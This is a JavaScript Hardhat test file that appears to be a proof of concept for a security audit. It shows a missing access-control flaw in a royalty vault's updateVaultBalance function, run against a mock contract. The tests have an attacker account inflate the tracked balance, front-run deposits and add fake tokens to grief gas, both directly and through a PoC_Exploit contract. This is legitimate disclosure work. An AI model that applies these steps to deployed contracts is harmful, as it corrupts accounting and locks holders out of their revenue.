const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("IpRoyaltyVault — Critical Vulnerability PoC", function () {
  let vault, exploit;
  let deployer, attacker, victim, marketplace;
  const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
  const INITIAL_DEPOSIT = ethers.parseEther("10");
  const ATTACK_INFLATE = ethers.parseEther("1000");

  before(async function () {
    [deployer, attacker, victim, marketplace] = await ethers.getSigners();
  });

  beforeEach(async function () {
    // Deploy the mock vault
    const Vault = await ethers.getContractFactory("MockRoyaltyVault");
    vault = await Vault.deploy();

    // Deploy the exploit contract
    const Exploit = await ethers.getContractFactory("PoC_Exploit");
    exploit = await Exploit.deploy();

    // Setup: Victim holds 50% of royalty tokens (50 out of 100)
    await vault.mint(victim.address, 50);
    await vault.mint(attacker.address, 50);

    // Deployer deposits 10 ETH worth of revenue (simulating marketplace)
    await vault.connect(marketplace).updateVaultBalance(ZERO_ADDRESS, INITIAL_DEPOSIT);
  });

  // ════════════════════════════════════════════
  //  TEST 1: No Access Control
  // ════════════════════════════════════════════

  it("🔴 ANYONE can call updateVaultBalance (missing access control)", async function () {
    // ANY random address can call updateVaultBalance
    await vault.connect(attacker).updateVaultBalance(ZERO_ADDRESS, ATTACK_INFLATE);

    // Verify the balance was inflated
    const trackedBalance = await vault.vaultAccBalance(ZERO_ADDRESS);
    expect(trackedBalance).to.equal(INITIAL_DEPOSIT + ATTACK_INFLATE);
  });

  // ════════════════════════════════════════════
  //  TEST 2: Balance Inflation — Claims Break
  // ════════════════════════════════════════════

  it("🔴 Balance inflation breaks victim's revenue claims", async function () {
    // Before attack: victim can claim 5 ETH (50% of 10 ETH)
    const claimableBefore = await vault.claimableRevenue(victim.address, ZERO_ADDRESS);
    expect(claimableBefore).to.equal(ethers.parseEther("5"));

    // Attacker inflates balance by 1000 ETH
    await vault.connect(attacker).updateVaultBalance(ZERO_ADDRESS, ATTACK_INFLATE);

    // Victim's claimable revenue is now inflated
    const claimableAfter = await vault.claimableRevenue(victim.address, ZERO_ADDRESS);
    const expectedInflated = (INITIAL_DEPOSIT + ATTACK_INFLATE) * 50n / 100n;

    expect(claimableAfter).to.equal(expectedInflated);
    console.log(`  📊 Claimable BEFORE: ${ethers.formatEther(claimableBefore)} ETH`);
    console.log(`  📊 Claimable AFTER:  ${ethers.formatEther(claimableAfter)} ETH`);

    // In a real vault, SafeTransferLib.safeTransferETH() would REVERT
    // because vault only has 10 ETH, not 505 ETH
    expect(claimableAfter).to.be.gt(claimableBefore);
  });

  // ════════════════════════════════════════════
  //  TEST 3: Front-Running Attack
  // ════════════════════════════════════════════

  it("🔴 Front-running corrupts marketplace accounting", async function () {
    // Attacker front-runs with 100 ETH inflation
    await vault.connect(attacker).updateVaultBalance(ZERO_ADDRESS, ethers.parseEther("100"));

    // Marketplace deposits legitimate 5 ETH
    await vault.connect(marketplace).updateVaultBalance(ZERO_ADDRESS, ethers.parseEther("5"));

    // Now vault shows 10 + 100 + 5 = 115 ETH, but only 15 ETH exists
    const trackedBalance = await vault.vaultAccBalance(ZERO_ADDRESS);
    expect(trackedBalance).to.equal(ethers.parseEther("115"));

    console.log(`  📊 Tracked balance: ${ethers.formatEther(trackedBalance)} ETH (fake)`);
    console.log(`  📊 Real vault has:  ${ethers.formatEther(INITIAL_DEPOSIT + ethers.parseEther("5"))} ETH`);
  });

  // ════════════════════════════════════════════
  //  TEST 4: Gas Griefing DoS
  // ════════════════════════════════════════════

  it("🔴 Gas griefing adds many tokens and DoSes transfers", async function () {
    // Measure initial gas for a claim
    const tx1 = await vault.connect(victim).claimRevenue(victim.address, ZERO_ADDRESS);
    const receipt1 = await tx1.wait();
    const gasBefore = receipt1.gasUsed;

    // Attack: Add 200 fake tokens
    for (let i = 0; i < 200; i++) {
      const fakeToken = "0x" + (10000 + i).toString(16).padStart(40, "0");
      await vault.connect(attacker).updateVaultBalance(fakeToken, 1);
    }

    // Verify tokens are tracked
    const tokenCount = await vault.revenueTokensLength();
    expect(tokenCount).to.equal(201n); // 200 fake + 1 real (ETH)

    // Need to reset victim's debt to claim again (after minting new tokens)
    // Actually, let's just measure gas by doing a dummy operation
    const tx2 = await vault.connect(attacker).claimRevenue(attacker.address, ZERO_ADDRESS);
    const receipt2 = await tx2.wait();
    const gasAfter = receipt2.gasUsed;

    console.log(`  ⛽ Gas cost BEFORE attack: ${gasBefore}`);
    console.log(`  ⛽ Gas cost AFTER 200 tokens: ${gasAfter}`);
    console.log(`  ⚠️  If gas exceeds block gas limit => PERMANENT DoS`);

    // Gas should be significantly higher
    expect(gasAfter).to.be.gt(gasBefore);
  });

  // ════════════════════════════════════════════
  //  TEST 5: Full Exploit Demo
  // ════════════════════════════════════════════

  it("🔴 FULL EXPLOIT SCENARIO — Complete breakdown", async function () {
    // STAGE 1: Initial state — victim can claim 5 ETH
    const initialClaimable = await vault.claimableRevenue(victim.address, ZERO_ADDRESS);
    expect(initialClaimable).to.equal(ethers.parseEther("5"));

    // STAGE 2: Attacker inflates balance by 10,000 ETH
    await vault.connect(attacker).updateVaultBalance(
      ZERO_ADDRESS,
      ethers.parseEther("10000")
    );

    // STAGE 3: Revenue claims are now completely broken
    const inflatedClaimable = await vault.claimableRevenue(victim.address, ZERO_ADDRESS);

    console.log("\n  ╔══════════════════════════════════════╗");
    console.log("  ║     FULL EXPLOIT DEMONSTRATION       ║");
    console.log("  ╚══════════════════════════════════════╝");
    console.log(`  ✅ Victim's REAL entitlement:   5.00 ETH`);
    console.log(`  ❌ Victim's INFLATED claimable: ${ethers.formatEther(inflatedClaimable)} ETH`);
    console.log(`  💀 If real vault: SafeTransferLib.safeTransferETH(victim, ${ethers.formatEther(inflatedClaimable)} ETH)`);
    console.log(`  💀 → REVERTS because vault only has 10 ETH!`);
    console.log(`  💀 → Victim can NEVER withdraw their legitimate 5 ETH!\n`);

    // The claim would revert if it tried to transfer the inflated amount
    // In our mock, claimRevenue() returns the pending amount (not actually sending)
    // But the accounting is permanently corrupted
    expect(inflatedClaimable).to.be.gt(initialClaimable);
  });

  // ════════════════════════════════════════════
  //  TEST 6: Exploit Contract Integration
  // ════════════════════════════════════════════

  it("🔴 PoC_Exploit contract — Balance Inflation via exploit contract", async function () {
    const inflateAmount = ethers.parseEther("5000");

    // Use the exploit contract to inflate balance
    await exploit.connect(attacker).exploit_BalanceInflation(
      vault.target,
      inflateAmount
    );

    // Verify inflation
    const tracked = await vault.vaultAccBalance(ZERO_ADDRESS);
    expect(tracked).to.equal(INITIAL_DEPOSIT + inflateAmount);

    console.log(`  🔧 Exploit contract called updateVaultBalance with 5000 ETH`);
    console.log(`  📊 Tracked balance inflated to: ${ethers.formatEther(tracked)} ETH`);
  });

  it("🔴 PoC_Exploit contract — Gas Griefing via exploit contract", async function () {
    const tokenCount = 150;

    // Use the exploit contract to add fake tokens
    await exploit.connect(attacker).exploit_GasGriefing_AddFakeTokens(
      vault.target,
      tokenCount
    );

    // Verify tokens were added
    const count = await vault.revenueTokensLength();
    expect(count).to.equal(BigInt(tokenCount) + 1n); // 150 fake + 1 real

    console.log(`  🔧 Exploit contract added ${tokenCount} fake tokens`);
    console.log(`  📊 Total revenue tokens tracked: ${count}`);
  });
});
